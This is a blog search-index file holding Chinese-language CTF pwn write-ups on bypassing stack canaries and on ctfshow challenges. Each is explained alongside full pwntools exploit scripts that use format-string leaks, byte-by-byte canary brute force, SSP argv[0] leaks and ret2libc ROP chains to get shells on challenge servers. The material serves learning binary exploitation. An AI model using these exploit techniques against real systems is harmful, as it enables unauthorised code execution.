<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>绕过canary的六种方法</title>
      <link href="/post/%E7%BB%95%E8%BF%87canary%E7%9A%84%E6%96%B9%E6%B3%95.html"/>
      <url>/post/%E7%BB%95%E8%BF%87canary%E7%9A%84%E6%96%B9%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<h1 id="leak绕过"><a href="#leak绕过" class="headerlink" title="leak绕过"></a>leak绕过</h1><p>通过泄露canary来绕过canary，常见的有覆盖掉前面的\x00让输出函数泄露，还有printf定点泄露</p><h2 id="stackguard1"><a href="#stackguard1" class="headerlink" title="stackguard1"></a><strong>stackguard1</strong></h2><p>一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放入rax中，rax会放入rbp-8的位置，最后清零eax<img src="https://i.loli.net/2021/10/22/iMEf48ZNa927yjJ.png" alt="屏幕截图 2021-10-22 195020.png"></p><p>程序运行到快结束时，会检查canary，首先将canary取出到rcx，rcx会和fs寄存器对应的偏移处取出进行比较，不同就会跳转到__stack_chk_fail@plt位置<img src="https://i.loli.net/2021/10/22/9yZLESIY7cpKO8r.png" alt="屏幕截图 2021-10-22 195405.png"></p><p>__stack_chk_fail函数会强行结束进程并弹出警告</p><p>分析栈结构：缓冲区过后就是canary，所以如果是简单的溢出覆盖返回地址就会覆盖到canary，从而导致程序崩溃。因此，如果要利用栈溢出就一定要绕过canary。所以思路就是先通过输出函数泄露canary的值，之后在覆盖时用泄露的canary值覆盖canary，其它的就覆盖成我们想要的，这样就绕过了canary。</p><p><img src="https://i.loli.net/2021/10/22/Rq56B1deJrujDh4.png" alt="image.png"></p><p>通过字符串列表找到bin/sh，找到调用的位置，发现函数canary_protect_me函数里面会调用这个字符串，仔细分析一下，可以断定圈里面的汇编代码组装成函数execve(“bin/sh”,0,0) 等价于system(“bin/sh”)，所以我们可以利用栈溢出跳转到这里就可以获得shell</p><p><img src="https://i.loli.net/2021/10/22/aFk6zUoXZ4H983J.png" alt="屏幕截图 2021-10-22 201418.png"></p><p>因为是gets函数最后会补上\x00，会终止printf读取，所以无法通过覆盖泄露，但因为是printf输出，所以可以采取格式化字符串漏洞泄露canary<img src="https://i.loli.net/2021/10/22/Sc4iJadPK5pWV32.png" alt="屏幕截图 2021-10-22 203619.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">back_door = (<span class="number">0x4011d6</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0401343</span></span><br><span class="line">bin_sh = <span class="number">0x402004</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./stackguard1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;123.57.230.48&#x27;</span>,<span class="number">12344</span>)</span><br><span class="line">payload1 = <span class="string">&#x27;%11$p&#x27;</span>  <span class="comment"># 泄露出第十一个参数的值</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(),<span class="number">16</span>)  <span class="comment"># 将接收的转为十六进制数</span></span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(back_door))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="one-by-one爆破"><a href="#one-by-one爆破" class="headerlink" title="one by one爆破"></a>one by one爆破</h1><p>虽然每次重启程序的canary会不同，但是在同一个进程中不同的线程中的canary是相同的，也就是说fork()函数创建的子进程中的canary是相同的。利用这一点我们可以逐字节爆破出来。</p><h2 id="bin1"><a href="#bin1" class="headerlink" title="bin1"></a>bin1</h2><p>程序中存在fork函数，而且还是无限输出，符合one by one爆破条件，因为是32位程序，canary第一个字符是\x00，所以我们只需要爆破3个字节，这三个字节对应的十六进制码范围为00~FF</p><p><img src="https://i.loli.net/2021/10/26/lFXwj8JfDAdoEsZ.png" alt="屏幕截图 2021-10-26 083224.png"></p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>,)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;the &quot;</span> + <span class="built_in">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="built_in">chr</span>(i)</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> a</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;sucess&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;canary: &quot;</span> + canary</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">addr = <span class="number">0x0804863B</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">100</span> + canary + <span class="string">&#x27;A&#x27;</span> * <span class="number">12</span> + p32(addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ssp攻击"><a href="#ssp攻击" class="headerlink" title="ssp攻击"></a>ssp攻击</h1><p>ssp攻击原理是通过输入足够长的字符串覆盖掉argv[0]，就能让canary保护输出我们想要地址上的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>) &#123;</span><br><span class="line">__fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *msg; &#123;</span><br><span class="line">      <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">         <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">              __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>, msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>) </span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是 stack_chk_fail()函数的源码，也就是触发canary后调用的函数，在libc_message函数中第二个%s输出的就是__libc_argv[0]，argv[0]是指向第一个启动参数字符串的指针。我们可以利用栈溢出将其覆盖成我们想要泄露的地址，当程序触发到canary时就可以泄露我们想要的东西了。</p><h2 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h2><p>主函数只调用了这个函数，这个函数中存在gets危险函数，可以利用它进行栈溢出操作。<img src="https://i.loli.net/2021/11/15/UrIOTvQfePFLdlj.png" alt="image.png"></p><p>在字符串窗口发现flag字样，根据提示我们可以知道flag就在这里，不过是在远端环境中<img src="https://i.loli.net/2021/11/15/vt1PArjFWlipJY9.png" alt="image.png"></p><p>所以我们只要将argv[0]指向这个地址就可以泄露。</p><p>但是后面发现行不通，并没有泄露我们想要泄露的地址里面的值。<img src="https://i.loli.net/2021/11/15/TZRsh7QgEb5V4Kd.png" alt="image.png"></p><p>回到伪代码里面发现下面一行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>((<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)v0 + <span class="number">0x600D20</span>LL), <span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">32</span> - v0));</span><br></pre></td></tr></table></figure><p>这行代码会将0x600D20这个地址里面的值清空，导致flag被清除。看了一下一些师傅的博客了解到ELF的重映射。<strong>当可执行文件足够小的时候，他的不同区段可能会被多次映射。也就是说该flag会在其他地方进行备份。</strong></p><p><img src="https://i.loli.net/2021/11/15/QGDmy4HdWTqeKcz.png" alt="image.png"></p><p>同时还要注意一点，64位下地址都是8的倍数所以最终我们要泄露的地址是0x400d20</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = remote(<span class="string">&quot;pwn.jarvisoj.com&quot;</span>,<span class="number">9877</span>)</span><br><span class="line">p.recvuntil(&#x27;name? &#x27;)</span><br><span class="line">p.sendline(p64(<span class="number">0x400d20</span>)*<span class="number">300</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-pwn</title>
      <link href="/post/ctfshow-pwn.html"/>
      <url>/post/ctfshow-pwn.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn03"><a href="#pwn03" class="headerlink" title="pwn03"></a>pwn03</h1><p>将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用<img src="https://i.loli.net/2021/10/16/SdbDYyzAl3TumcV.png" alt="image.png"></p><p>所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤：</p><ul><li>泄露 puts地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28015</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]       <span class="comment"># 获取puts的plt</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]           <span class="comment"># 获取puts的got</span></span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]          <span class="comment"># 获取程序开始地址</span></span><br><span class="line">payload1 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>,puts_plt,start_addr,puts_got])         <span class="comment"># 泄露puts的got地址</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)         <span class="comment"># 这里耽误了好久，因为要读取掉两个换行符，不然后面获取地址就会出错</span></span><br><span class="line">libc_puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])          <span class="comment"># 接收泄露的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts_addr)        <span class="comment"># 找到对应的libc</span></span><br><span class="line">libcbase = libc_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)         <span class="comment"># 计算基地址</span></span><br><span class="line">sys_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)         <span class="comment"># 算出system函数的地址</span></span><br><span class="line">bin_sh = libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">13</span>,sys_addr,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn04"><a href="#pwn04" class="headerlink" title="pwn04"></a>pwn04</h1><p>用ida打开发现存在明显的栈溢出并且还存在后门函数<img src="https://i.loli.net/2021/10/16/YkhGbwR5uyam1Np.png" alt="屏幕截图 2021-10-16 181459.png"></p><p><img src="https://i.loli.net/2021/10/16/odXSjLRgc1mpGra.png" alt="屏幕截图 2021-10-16 181732.png"></p><p>checksec查看发现存在canary保护，所以思路就是绕过canary保护进入后门函数从而获取shell</p><p>通过IDA查看可以发现canary在ebp-c的位置，所以我们可以利用第一轮输入来泄露canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>,payload1)</span><br><span class="line">a = p.recvline()</span><br><span class="line">canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>因为存在回显所以要将回显接收不然canary就会出错，已经踩坑</strong></p><p><img src="https://i.loli.net/2021/10/16/Wof2tuehQjwRYgx.png" alt="屏幕截图 2021-10-16 182347.png"></p><p>获取了canary接下来就是绕过canary进入后门函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span>,canary,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,get_shell])</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure><p><strong>因为canary是四个字节，而到返回地址还需要0x70-0x64-4=8个字节，所以需要补充8个字节</strong></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28132</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ex2&#x27;)</span></span><br><span class="line">get_shell = <span class="number">0x80485AF</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>,payload1)</span><br><span class="line">a = p.recvline()</span><br><span class="line">canary = p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line">payload2 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span>,canary,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,get_shell])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>exp2：</p><p>也是通过printf泄露，不过是通过计算canary到printf的偏移来泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./ex&quot;)</span></span><br><span class="line">p =remote(<span class="string">&quot;111.231.70.44&quot;</span>,<span class="number">28097</span>)</span><br><span class="line">p.recv()</span><br><span class="line">leak_canary = <span class="string">&quot;%31$x&quot;</span></span><br><span class="line">p.sendline(leak_canary)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(),<span class="number">16</span>)</span><br><span class="line">print(<span class="built_in">hex</span>(canary))</span><br><span class="line">getshell = <span class="string">b&quot;a&quot;</span> * <span class="number">100</span> + p32(canary) + <span class="string">b&quot;b&quot;</span> * <span class="number">12</span> + p32(<span class="number">0x0804859B</span>)</span><br><span class="line">p.sendline(getshell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn07"><a href="#pwn07" class="headerlink" title="pwn07"></a>pwn07</h1><p>打开发现是64位程序，分析一下发现pwn03做法相同，泄露函数地址从而获取libc版本找到system函数进而获取shell。在某些细节上还是有点不同，32位是通过栈传递参数，而64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：</p><p>泄露puts函数需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure><p>在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure><p>p64(ret_addr)目的用于堆栈对齐，不然后面会报错。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28138</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x04006e3</span></span><br><span class="line">ret_addr = <span class="number">0x0004006E4</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">libc_puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts_addr)</span><br><span class="line">libcbase = libc_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn10"><a href="#pwn10" class="headerlink" title="pwn10"></a>pwn10</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%a  浮点数、十六进制数字和p-记数法（c99</span><br><span class="line">%A  浮点数、十六进制数字和p-记法（c99）</span><br><span class="line">%c  一个字符(char)</span><br><span class="line">%C  一个ISO宽字符</span><br><span class="line">%d  有符号十进制整数(int)（%ld、%Ld：长整型数据(long),%hd：输出短整形。）　</span><br><span class="line">%e  浮点数、e-记数法</span><br><span class="line">%E  浮点数、E-记数法</span><br><span class="line">%f  单精度浮点数(默认float)、十进制记数法（%.nf  这里n表示精确到小数位后n位.十进制计数）</span><br><span class="line">%g  根据数值不同自动选择%f或%e．</span><br><span class="line">%G  根据数值不同自动选择%f或%e.</span><br><span class="line">%i  有符号十进制数（与%d相同）</span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置</span><br><span class="line">%o  无符号八进制整数</span><br><span class="line">%p  指针</span><br><span class="line">%s  对应字符串char*（%s &#x3D; %hs &#x3D; %hS 输出 窄字符）</span><br><span class="line">%S  对应宽字符串WCAHR*（%ws &#x3D; %S 输出宽字符串）</span><br><span class="line">%u  无符号十进制整数(unsigned int)</span><br><span class="line">%x  使用十六进制数字0xf的无符号十六进制整数　</span><br><span class="line">%X  使用十六进制数字0xf的无符号十六进制整数</span><br><span class="line">%%  打印一个百分号 </span><br><span class="line">%I64d 用于INT64 或者 long long</span><br><span class="line">%I64u 用于UINT64 或者 unsigned long long</span><br><span class="line">%I64x 用于64位16进制数据</span><br><span class="line">%m.n : m指域宽，即对应的输出项在输出设备上所占的字符数。n指精度。用于说明输出的实型数的小数位数。为指定n时，隐含的精度为n&#x3D;6位。</span><br><span class="line">l 对整型指long型，对实型指double型。h用于将整型的格式字符修正为short型。</span><br></pre></td></tr></table></figure><p>打开后发现当num==16时就可以得到flag，但是没有栈溢出可以覆盖num的值。仔细观察，这里输出用的是printf函数存在格式字符串漏洞，我们可以利用%n去修改num，首先需要num的地址，其次需要一个参数指向num。通过发现我们可以看到scanf对format赋值了两次，所以我们可以先将num的地址赋给format，接下来使用%n来修改format指向num的值</p><p><img src="https://i.loli.net/2021/10/26/hMP7uoKZlkewSvn.png" alt="屏幕截图 2021-10-26 092828.png"></p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28101</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn10&quot;)</span></span><br><span class="line">num_addr = <span class="number">0x0804A030</span></span><br><span class="line">payload = p32(num_addr)+<span class="string">&quot;aaaaaaaaaaaa%7$n&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="萌新赛-签到题"><a href="#萌新赛-签到题" class="headerlink" title="萌新赛-签到题"></a>萌新赛-签到题</h1><p>就是简单的libc泄露。计算一下src的偏移，找到相应gadget泄露函数地址在获得libc的版本获取system函数和字符串bin/sh地址，最后组装一下就行</p><p><img src="https://i.loli.net/2021/10/26/6IxpjB9mK4WbrRO.png" alt="屏幕截图 2021-10-26 124355.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn_check_in&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn_check_in&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">start_addr=elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400793</span></span><br><span class="line">ret_addr = <span class="number">0x40053e</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;[+] command successful!\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span 